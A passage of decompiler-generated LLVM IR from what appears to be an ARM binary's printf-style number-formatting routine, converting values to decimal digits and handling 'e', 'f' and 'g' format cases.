  %v2_13208 = or i32 %v1_13208, 1
  store i32 %v2_13208, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_1320c = phi i32 [ 1, %bb229 ], [ %v1_13208, %bb228 ]
  %v2_1320c = icmp eq i32 %v0_1320c, 0
  store i1 %v2_1320c, i1* %cpsr_z.global-to-local, align 1
  %v1_13210 = trunc i32 %v2_131f0 to i8
  store i8 %v1_13210, i8* %v2_131ec, align 1
  %v0_13214 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13214, label %dec_label_pc_13218, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_131f0.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_131ec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_13218:                               ; preds = %._crit_edge93
  store i32 %v2_131bc, i32* %r2.global-to-local, align 4
  %v2_1321c = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_1321c, i32* %r3.global-to-local, align 4
  %v0_13220 = load i32, i32* %r1.global-to-local, align 4
  %v3_13220 = icmp uge i32 %v0_13220, %v2_1321c
  %v9_13220 = icmp eq i32 %v0_13220, %v2_1321c
  store i1 %v9_13220, i1* %cpsr_z.global-to-local, align 1
  %v2_13224 = xor i1 %v3_13220, true
  %v3_13224 = or i1 %v9_13220, %v2_13224
  br i1 %v3_13224, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_13218
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_1321c, i32* %r2.global-to-local, align 4
  store i32 %v2_1321c, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_13218, %bb230
  %v2_13244 = phi i32 [ %v2_1321c, %bb230 ], [ %v0_13220, %dec_label_pc_13218 ]
  %v4_13238144 = phi i32 [ %v2_1321c, %bb230 ], [ %v2_131bc, %dec_label_pc_13218 ]
  %v2_13230 = xor i1 %v9_13220, true
  %v3_13230 = and i1 %v3_13220, %v2_13230
  br i1 %v3_13230, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_13224, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_13234 = load i32, i32* @lr, align 4
  %v5_13234 = add i32 %v4_13234, 1
  store i32 %v5_13234, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_13230, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_13238 = add i32 %v4_13238144, 2
  store i32 %v5_13238, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_13240 = load i32, i32* %sb.global-to-local, align 4
  %v7_13240 = icmp eq i32 %v0_13240, 103
  store i1 %v7_13240, i1* %cpsr_z.global-to-local, align 1
  %v3_13244 = add i32 %v2_13244, 1
  %v4_13244 = inttoptr i32 %v3_13244 to i8*
  store i8 0, i8* %v4_13244, align 1
  %v0_13248 = load i32, i32* %r1.global-to-local, align 4
  %v1_13248 = add i32 %v0_13248, 1
  store i32 %v1_13248, i32* %lr.global-to-local, align 4
  %v0_1324c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1324c, label %dec_label_pc_13250, label %dec_label_pc_13278

dec_label_pc_13250:                               ; preds = %bb236
  %v0_13250 = load i32, i32* %r0.global-to-local, align 4
  %v1_13250 = load i32, i32* %ip.global-to-local, align 4
  %v2_13250 = sub i32 %v0_13250, %v1_13250
  %v4_13250 = xor i32 %v1_13250, %v0_13250
  %v5_13250 = xor i32 %v2_13250, %v0_13250
  %v6_13250 = and i32 %v5_13250, %v4_13250
  %v7_13250 = icmp slt i32 %v6_13250, 0
  %v8_13250 = icmp slt i32 %v2_13250, 0
  %v9_13250 = icmp eq i32 %v0_13250, %v1_13250
  %v3_13254 = xor i1 %v8_13250, %v7_13250
  %v4_13254 = or i1 %v9_13250, %v3_13254
  %.258 = zext i1 %v4_13254 to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_1325c = add i32 %v0_13250, 4
  %v3_1325c = sub i32 0, %v0_13250
  %v4_1325c = and i32 %v1_1325c, %v3_1325c
  %v5_1325c = icmp slt i32 %v4_1325c, 0
  %v6_1325c = icmp slt i32 %v1_1325c, 0
  %v7_1325c = icmp eq i32 %v1_1325c, 0
  store i1 %v7_1325c, i1* %cpsr_z.global-to-local, align 1
  %v2_13260 = xor i1 %v6_1325c, %v5_1325c
  br i1 %v2_13260, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_13250
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13594

bb239:                                            ; preds = %dec_label_pc_13250
  %v2_13264 = icmp eq i1 %v4_13254, false
  store i1 %v2_13264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13264, label %dec_label_pc_13594, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_13268 = sub i32 %v1_13250, %v0_13250
  store i32 %v3_13268, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13284

dec_label_pc_13278:                               ; preds = %bb236
  %v0_13278 = load i32, i32* %sb.global-to-local, align 4
  %v7_13278 = icmp eq i32 %v0_13278, 102
  store i1 %v7_13278, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_13278, i32* %r8.global-to-local, align 4
  br i1 %v7_13278, label %dec_label_pc_13278.dec_label_pc_13284_crit_edge, label %dec_label_pc_13294

dec_label_pc_13278.dec_label_pc_13284_crit_edge:  ; preds = %dec_label_pc_13278
  %v0_13284.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13284

dec_label_pc_13284:                               ; preds = %.thread24, %dec_label_pc_13278.dec_label_pc_13284_crit_edge
  %v0_13284 = phi i32 [ %v0_13284.pre, %dec_label_pc_13278.dec_label_pc_13284_crit_edge ], [ %v0_13250, %.thread24 ]
  %v1_13284 = icmp slt i32 %v0_13284, 0
  %v2_13284 = icmp eq i32 %v0_13284, 0
  store i1 %v2_13284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_13284, label %bb240, label %dec_label_pc_13294

bb240:                                            ; preds = %dec_label_pc_13284
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_1328c = load i32, i32* %r2.global-to-local, align 4
  %v6_1328c = add i32 %v5_1328c, -1
  %v7_1328c = inttoptr i32 %v6_1328c to i8*
  store i8 48, i8* %v7_1328c, align 1
  %v8_1328c = load i32, i32* %r2.global-to-local, align 4
  %v9_1328c = add i32 %v8_1328c, -1
  store i32 %v9_1328c, i32* %r2.global-to-local, align 4
  %v0_13290.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_132c4.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13294

dec_label_pc_13294:                               ; preds = %bb240, %dec_label_pc_13284, %dec_label_pc_13594, %dec_label_pc_13278
  %v1_132c4 = phi i32 [ %v1_13248, %dec_label_pc_13278 ], [ %v1_13248, %dec_label_pc_13594 ], [ %v1_132c4.pre.pre, %bb240 ], [ %v1_13248, %dec_label_pc_13284 ]
  %v1_1333c30 = phi i32 [ 0, %dec_label_pc_13278 ], [ 0, %dec_label_pc_13594 ], [ %v0_13290.pre, %bb240 ], [ %v0_13284, %dec_label_pc_13284 ]
  store i32 %v1_1333c30, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_132a0 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_132a0, i32* %r3.global-to-local, align 4
  %v0_132ac = load i32, i32* %r2.global-to-local, align 4
  %v1_132ac = inttoptr i32 %v0_132ac to i8*
  %v2_132ac = load i8, i8* %v1_132ac, align 1
  %v3_132ac = zext i8 %v2_132ac to i32
  store i32 %v3_132ac, i32* %r3.global-to-local, align 4
  %v5_132ac = add i32 %v0_132ac, 1
  store i32 %v5_132ac, i32* %r2.global-to-local, align 4
  %v1_132b0 = icmp slt i32 %v1_1333c30, 0
  %v2_132b0 = icmp eq i32 %v1_1333c30, 0
  store i1 %v2_132b0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_132ac, i32* %r6.global-to-local, align 4
  store i32 %v3_132ac, i32* %stack_var_-42, align 4
  %v2_132c4 = sub i32 %v1_132c4, %v5_132ac
  store i32 %v2_132c4, i32* %ip.global-to-local, align 4
  br i1 %v1_132b0, label %.thread, label %dec_label_pc_132d0

.thread:                                          ; preds = %dec_label_pc_13294
  %v5_132c8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_132c8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1334c

dec_label_pc_132d0:                               ; preds = %dec_label_pc_13294
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_132d4 = sub i32 %v1_1333c30, %v2_132c4
  %v4_132d4 = xor i32 %v2_132c4, %v1_1333c30
  %v5_132d4 = xor i32 %v2_132d4, %v1_1333c30
  %v6_132d4 = and i32 %v5_132d4, %v4_132d4
  %v7_132d4 = icmp slt i32 %v6_132d4, 0
  %v8_132d4 = icmp slt i32 %v2_132d4, 0
  %v9_132d4 = icmp eq i32 %v1_1333c30, %v2_132c4
  store i1 %v9_132d4, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_132e0 = xor i1 %v8_132d4, %v7_132d4
  br i1 %v2_132e0, label %dec_label_pc_1332c, label %dec_label_pc_132e4

dec_label_pc_132e4:                               ; preds = %dec_label_pc_132d0
  store i32 %v2_132d4, i32* %r2.global-to-local, align 4
  %v2_132e8 = icmp eq i32 %v2_132d4, 0
  store i1 %v2_132e8, i1* %cpsr_z.global-to-local, align 1
  %v2_132ec = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_132ec, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_132d4, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_13300

.thread148:                                       ; preds = %dec_label_pc_132e4
  %v7_132f4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_132f4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_13300:                               ; preds = %dec_label_pc_132e4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33337), i32* %r3.global-to-local, align 4
  %v2_13310 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_13310, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_1334c

dec_label_pc_1332c:                               ; preds = %dec_label_pc_132d0
  store i1 %v2_132b0, i1* %cpsr_z.global-to-local, align 1
  %v2_13330 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_13330, i32* %lr.global-to-local, align 4
  br i1 %v2_132b0, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_1332c
  %v3_13338 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_13338, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_1332c
  %v3_1333c = sub i32 %v2_132c4, %v1_1333c30
  store i32 %v3_1333c, i32* %ip.global-to-local, align 4
  %v3_1334063 = add i32 %v5_132ac, %v1_1333c30
  store i32 %v3_1334063, i32* %r6.global-to-local, align 4
  %v3_13344 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_13344, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_1338c265 = phi i32 [ %v3_13338, %bb242 ], [ %v3_13344, %bb243 ], [ %v7_132f4, %.thread148 ]
  %v0_13360102 = phi i32 [ %v2_132c4, %bb242 ], [ %v3_1333c, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1334c

dec_label_pc_1334c:                               ; preds = %.thread, %dec_label_pc_13300, %.thread34
  %v1_1338c = phi i32 [ %v2_13310, %dec_label_pc_13300 ], [ %v1_1338c265, %.thread34 ], [ %v5_132c8, %.thread ]
  %v0_133a0109 = phi i32 [ -1, %dec_label_pc_13300 ], [ -1, %.thread34 ], [ %v1_1333c30, %.thread ]
  %v0_13360 = phi i32 [ 0, %dec_label_pc_13300 ], [ %v0_13360102, %.thread34 ], [ %v2_132c4, %.thread ]
  %v3_1334c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1334c, i32* %r2.global-to-local, align 4
  %v1_13350 = add i32 %v3_1334c, 12
  %v2_13350 = inttoptr i32 %v1_13350 to i32*
  %v3_13350 = load i32, i32* %v2_13350, align 4
  %v1_13354 = and i32 %v3_13350, 16
  store i32 %v1_13354, i32* %r4.global-to-local, align 4
  %v2_13354 = icmp eq i32 %v1_13354, 0
  %tmp270 = zext i1 %v2_13354 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_13360 = icmp eq i32 %v0_13360, 0
  store i1 %v2_13360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13360, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_1334c
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1337c

bb246:                                            ; preds = %dec_label_pc_1334c
  store i1 %v2_13354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13354, label %dec_label_pc_13370, label %dec_label_pc_1337c

dec_label_pc_13370:                               ; preds = %bb246
  %v0_13370 = load i32, i32* %sb.global-to-local, align 4
  %v7_13370 = icmp eq i32 %v0_13370, 103
  store i1 %v7_13370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13370, label %dec_label_pc_133a0, label %bb247

bb247:                                            ; preds = %dec_label_pc_13370
  %v1_13374 = load i32, i32* %fp.global-to-local, align 4
  %v3_13374 = icmp eq i32 %v1_13374, 0
  store i1 %v3_13374, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_13374, 1
  br i1 %tmp248, label %dec_label_pc_133a0, label %dec_label_pc_1337c

dec_label_pc_1337c:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33340), i32* %r3.global-to-local, align 4
  %v2_1338c = inttoptr i32 %v1_1338c to i32*
  store i32 112, i32* %v2_1338c, align 4
  %v0_13390 = load i32, i32* %r3.global-to-local, align 4
  %v1_13390 = add i32 %v0_13390, 16
  store i32 %v1_13390, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_13398 = load i32, i32* %r7.global-to-local, align 4
  %v1_13398 = add i32 %v0_13398, 4
  %v2_13398 = inttoptr i32 %v1_13398 to i32*
  store i32 1, i32* %v2_13398, align 4
  %v4_13398 = add i32 %v0_13398, 8
  %v5_13398 = inttoptr i32 %v4_13398 to i32*
  %v6_13398 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_13398, i32* %v5_13398, align 4
  %v0_1339c = load i32, i32* %r7.global-to-local, align 4
  %v1_1339c = add i32 %v0_1339c, 12
  store i32 %v1_1339c, i32* %r7.global-to-local, align 4
  %v0_133a0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_133a0

dec_label_pc_133a0:                               ; preds = %dec_label_pc_13370, %bb247, %dec_label_pc_1337c
  %v1_133c0 = phi i32 [ %v1_1338c, %bb247 ], [ %v1_1339c, %dec_label_pc_1337c ], [ %v1_1338c, %dec_label_pc_13370 ]
  %v0_133a0 = phi i32 [ %v0_133a0109, %bb247 ], [ %v0_133a0.pre, %dec_label_pc_1337c ], [ %v0_133a0109, %dec_label_pc_13370 ]
  %v1_133a0 = add i32 %v0_133a0, 1
  store i32 %v1_133a0, i32* %lr.global-to-local, align 4
  %v6_133a0 = icmp slt i32 %v1_133a0, 0
  %v7_133a0 = icmp eq i32 %v1_133a0, 0
  store i1 %v7_133a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_133a0, label %dec_label_pc_133a8, label %dec_label_pc_133cc

dec_label_pc_133a8:                               ; preds = %dec_label_pc_133a0
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33337), i32* %r3.global-to-local, align 4
  %v1_133b8 = sub i32 -1, %v0_133a0
  store i32 %v1_133b8, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_133c0 = inttoptr i32 %v1_133c0 to i32*
  store i32 176, i32* %v2_133c0, align 4
  %v0_133c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_133c4 = add i32 %v0_133c4, 4
  %v2_133c4 = inttoptr i32 %v1_133c4 to i32*
  %v3_133c4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_133c4, i32* %v2_133c4, align 4
  %v4_133c4 = add i32 %v0_133c4, 8
  %v5_133c4 = inttoptr i32 %v4_133c4 to i32*
  %v6_133c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_133c4, i32* %v5_133c4, align 4
  %v0_133c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_133c8 = add i32 %v0_133c8, 12
  store i32 %v1_133c8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_133cc

dec_label_pc_133cc:                               ; preds = %dec_label_pc_133a0, %dec_label_pc_133a8
  %v2_133d4 = phi i32 [ %v1_133c0, %dec_label_pc_133a0 ], [ %v1_133c8, %dec_label_pc_133a8 ]
  %v0_133cc = load i32, i32* %ip.global-to-local, align 4
  %v2_133cc = icmp eq i32 %v0_133cc, 0
  store i1 %v2_133cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_133cc, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_133cc
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_133d4 = inttoptr i32 %v2_133d4 to i32*
  store i32 112, i32* %v3_133d4, align 4
  %v1_133d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_133d8 = load i32, i32* %r7.global-to-local, align 4
  %v3_133d8 = add i32 %v2_133d8, 8
  %v4_133d8 = inttoptr i32 %v3_133d8 to i32*
  store i32 %v1_133d8, i32* %v4_133d8, align 4
  %v1_133dc = load i32, i32* %ip.global-to-local, align 4
  %v2_133dc = load i32, i32* %r7.global-to-local, align 4
  %v3_133dc = add i32 %v2_133dc, 4
  %v4_133dc = inttoptr i32 %v3_133dc to i32*
  store i32 %v1_133dc, i32* %v4_133dc, align 4
  %v1_133e0 = load i32, i32* %r7.global-to-local, align 4
  %v2_133e0 = add i32 %v1_133e0, 12
  store i32 %v2_133e0, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_133cc, %bb249
  %v1_13418 = phi i32 [ %v2_133d4, %dec_label_pc_133cc ], [ %v2_133e0, %bb249 ]
  %v0_133e4 = load i32, i32* %sb.global-to-local, align 4
  %v7_133e4 = icmp eq i32 %v0_133e4, 103
  store i1 %v7_133e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_133e4, label %dec_label_pc_133ec, label %dec_label_pc_133f4

dec_label_pc_133ec:                               ; preds = %.thread46
  %v0_133ec = load i32, i32* %r4.global-to-local, align 4
  %v2_133ec = icmp eq i32 %v0_133ec, 0
  store i1 %v2_133ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_133ec, label %dec_label_pc_13424, label %dec_label_pc_133f4

dec_label_pc_133f4:                               ; preds = %.thread46, %dec_label_pc_133ec
  %v0_133f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_133f4 = load i32, i32* %ip.global-to-local, align 4
  %v2_133f4 = sub i32 %v1_133f4, %v0_133f4
  store i32 %v2_133f4, i32* %r1.global-to-local, align 4
  %v1_133f8 = load i32, i32* %fp.global-to-local, align 4
  %v2_133f8 = sub i32 %v2_133f4, %v1_133f8
  %v4_133f8 = xor i32 %v1_133f8, %v2_133f4
  %v5_133f8 = xor i32 %v2_133f8, %v2_133f4
  %v6_133f8 = and i32 %v5_133f8, %v4_133f8
  %v7_133f8 = icmp slt i32 %v6_133f8, 0
  %v8_133f8 = icmp slt i32 %v2_133f8, 0
  %v9_133f8 = icmp eq i32 %v2_133f4, %v1_133f8
  store i1 %v9_133f8, i1* %cpsr_z.global-to-local, align 1
  %v2_133fc = xor i1 %v8_133f8, %v7_133f8
  br i1 %v2_133fc, label %dec_label_pc_13400, label %dec_label_pc_13424

dec_label_pc_13400:                               ; preds = %dec_label_pc_133f4
  %v2_1340c = sub i32 %v1_133f8, %v2_133f4
  store i32 %v2_1340c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33337), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_13418 = inttoptr i32 %v1_13418 to i32*
  store i32 176, i32* %v2_13418, align 4
  %v0_1341c = load i32, i32* %r7.global-to-local, align 4
  %v1_1341c = add i32 %v0_1341c, 4
  %v2_1341c = inttoptr i32 %v1_1341c to i32*
  %v3_1341c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1341c, i32* %v2_1341c, align 4
  %v4_1341c = add i32 %v0_1341c, 8
  %v5_1341c = inttoptr i32 %v4_1341c to i32*
  %v6_1341c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1341c, i32* %v5_1341c, align 4
  %v0_13420 = load i32, i32* %r7.global-to-local, align 4
  %v1_13420 = add i32 %v0_13420, 12
  store i32 %v1_13420, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13424

dec_label_pc_13424:                               ; preds = %dec_label_pc_133f4, %dec_label_pc_133ec, %dec_label_pc_13400
  %v1_134b8.pre.pre = phi i32 [ %v1_13418, %dec_label_pc_133f4 ], [ %v1_13418, %dec_label_pc_133ec ], [ %v1_13420, %dec_label_pc_13400 ]
  %v0_13424 = load i32, i32* %r8.global-to-local, align 4
  %v7_13424 = icmp eq i32 %v0_13424, 102
  store i1 %v7_13424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13424, label %dec_label_pc_134ac, label %dec_label_pc_1342c

dec_label_pc_1342c:                               ; preds = %dec_label_pc_13424
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_13430 = load i32, i32* %r0.global-to-local, align 4
  %v1_13430 = icmp slt i32 %v0_13430, 0
  %v2_13430 = icmp eq i32 %v0_13430, 0
  store i1 %v2_13430, i1* %cpsr_z.global-to-local, align 1
  %v4_13434 = select i1 %tmp275, i32 %v4_13150126130, i32 101
  store i32 %v4_13434, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_13444 = sub i32 0, %v0_13430
  %storemerge158 = select i1 %v1_13430, i32 %v4_13444, i32 %v0_13430
  %tmp271 = ashr i32 %v0_13430, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_1344c = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_1344c, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13454

dec_label_pc_13454:                               ; preds = %dec_label_pc_13484, %dec_label_pc_13454, %dec_label_pc_1342c
  %v2_1346c = phi i32 [ %v2_1344c, %dec_label_pc_1342c ], [ %v6_1346c, %dec_label_pc_13454 ], [ %v6_1346c, %dec_label_pc_13484 ]
  %v0_13464 = phi i32 [ %storemerge158, %dec_label_pc_1342c ], [ %v2_13470, %dec_label_pc_13454 ], [ %v2_13470, %dec_label_pc_13484 ]
  %v3_1345c = urem i32 %v0_13464, 10
  %v1_13460 = or i32 %v3_1345c, 48
  store i32 %v1_13460, i32* %r3.global-to-local, align 4
  store i32 %v0_13464, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1346c = trunc i32 %v1_13460 to i8
  %v3_1346c = add i32 %v2_1346c, -1
  %v4_1346c = inttoptr i32 %v3_1346c to i8*
  store i8 %v1_1346c, i8* %v4_1346c, align 1
  %v5_1346c = load i32, i32* %r6.global-to-local, align 4
  %v6_1346c = add i32 %v5_1346c, -1
  store i32 %v6_1346c, i32* %r6.global-to-local, align 4
  %v0_13470 = load i32, i32* %r0.global-to-local, align 4
  %v1_13470 = load i32, i32* %r1.global-to-local, align 4
  %v2_13470 = sdiv i32 %v0_13470, %v1_13470
  store i32 %v2_13470, i32* %r0.global-to-local, align 4
  %v0_13474 = load i32, i32* %r8.global-to-local, align 4
  %v1_13474 = add i32 %v0_13474, 1
  store i32 %v1_13474, i32* %r8.global-to-local, align 4
  %v7_13478 = icmp eq i32 %v1_13474, 3
  store i1 %v7_13478, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_13470, i32* %r5.global-to-local, align 4
  br i1 %v7_13478, label %dec_label_pc_13454, label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %dec_label_pc_13454
  %v2_13484 = icmp eq i32 %v2_13470, 0
  store i1 %v2_13484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13484, label %dec_label_pc_1348c, label %dec_label_pc_13454

dec_label_pc_1348c:                               ; preds = %dec_label_pc_13484
  %v1_1348c = add i32 %v5_1346c, -2
  store i32 %v1_1348c, i32* %r3.global-to-local, align 4
  %v0_13490 = load i32, i32* %sl.global-to-local, align 4
  %v1_13490 = trunc i32 %v0_13490 to i8
  %v4_13490 = inttoptr i32 %v1_1348c to i8*
  store i8 %v1_13490, i8* %v4_13490, align 1
  %v0_13494 = load i32, i32* %r3.global-to-local, align 4
  %v1_13494 = add i32 %v0_13494, -1
  store i32 %v1_13494, i32* %r2.global-to-local, align 4
  %v0_13498 = load i32, i32* %r4.global-to-local, align 4
  %v1_13498 = trunc i32 %v0_13498 to i8
  %v4_13498 = inttoptr i32 %v1_13494 to i8*
  store i8 %v1_13498, i8* %v4_13498, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_134a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_134a0 = inttoptr i32 %v0_134a0 to i32*
  store i32 112, i32* %v1_134a0, align 4
  %v3_134a0 = add i32 %v0_134a0, 4
  %v4_134a0 = inttoptr i32 %v3_134a0 to i32*
  %v5_134a0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_134a0, i32* %v4_134a0, align 4
  %v0_134a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_134a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_134a4 = add i32 %v1_134a4, 8
  %v3_134a4 = inttoptr i32 %v2_134a4 to i32*
  store i32 %v0_134a4, i32* %v3_134a4, align 4
  %v0_134a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_134a8 = add i32 %v0_134a8, 12
  store i32 %v1_134a8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_134ac

dec_label_pc_134ac:                               ; preds = %dec_label_pc_13424, %.thread124, %dec_label_pc_1348c
  %v1_134b8.pre = phi i32 [ %v2_12f84, %.thread124 ], [ %v1_134a8, %dec_label_pc_1348c ], [ %v1_134b8.pre.pre, %dec_label_pc_13424 ]
  %v2_134ac = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_134ac, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_134b0

dec_label_pc_134b0:                               ; preds = %dec_label_pc_134b0, %dec_label_pc_134ac
  %v0_134b0 = phi i32 [ %v2_134ac, %dec_label_pc_134ac ], [ %v4_134b0, %dec_label_pc_134b0 ]
  %stack_var_-188.0 = phi i32 [ %v3_12e20, %dec_label_pc_134ac ], [ %v2_134bc, %dec_label_pc_134b0 ]
  %v1_134b0 = inttoptr i32 %v0_134b0 to i32*
  %v2_134b0 = load i32, i32* %v1_134b0, align 4
  store i32 %v2_134b0, i32* %r3.global-to-local, align 4
  %v4_134b0 = add i32 %v0_134b0, 12
  store i32 %v4_134b0, i32* %r2.global-to-local, align 4
  %v3_134b8 = icmp ult i32 %v4_134b0, %v1_134b8.pre
  %v2_134bc = sub i32 %stack_var_-188.0, %v2_134b0
  store i32 %v2_134bc, i32* %ip.global-to-local, align 4
  br i1 %v3_134b8, label %dec_label_pc_134b0, label %dec_label_pc_134c8

dec_label_pc_134c8:                               ; preds = %dec_label_pc_134b0
  %v3_134c8 = load i8, i8* %stack_var_-46, align 1
  %v4_134c8 = sext i8 %v3_134c8 to i32
  store i32 %v4_134c8, i32* %r3.global-to-local, align 4
  store i32 %v4_134c8, i32* %r2.global-to-local, align 4
  %v2_134cc = icmp eq i8 %v3_134c8, 0
  store i1 %v2_134cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_134cc, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_134c8
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_134c8, %bb253
  %v1_1352c = phi i32 [ %v4_134c8, %dec_label_pc_134c8 ], [ 1, %bb253 ]
  %v2_134d4 = sub i32 %v2_134bc, %v1_1352c
  store i32 %v2_134d4, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
